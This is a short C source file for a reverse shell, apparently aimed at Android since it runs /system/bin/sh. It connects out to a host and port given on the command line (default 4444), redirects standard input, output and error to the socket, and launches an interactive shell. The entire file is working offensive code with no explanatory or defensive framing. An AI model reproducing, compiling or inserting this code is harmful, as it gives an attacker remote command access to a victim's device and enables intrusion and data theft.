#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

#define SHELL "/system/bin/sh"

int main(int argc, char **argv) {
    const char *host;
    int port;
    int sock;
    struct hostent *he;
    struct sockaddr_in sa;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <host> [port]\n", argv[0]);
        return 1;
    }

    host = argv[1];
    port = (argc >= 3) ? atoi(argv[2]) : 4444;

    if (port <= 0 || port > 65535) {
        fprintf(stderr, "[!] invalid port\n");
        return 1;
    }

    if ((he = gethostbyname(host)) == NULL) {
        fprintf(stderr, "[!] cannot resolve %s\n", host);
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons((unsigned short)port);
    memcpy(&sa.sin_addr, he->h_addr_list[0], (size_t)he->h_length);

    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("connect");
        close(sock);
        return 1;
    }

    fprintf(stderr, "[+] connected to %s:%d\n", host, port);

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execl(SHELL, "sh", "-i", (char *)NULL);
    perror("execl");
    close(sock);
    return 1;
}
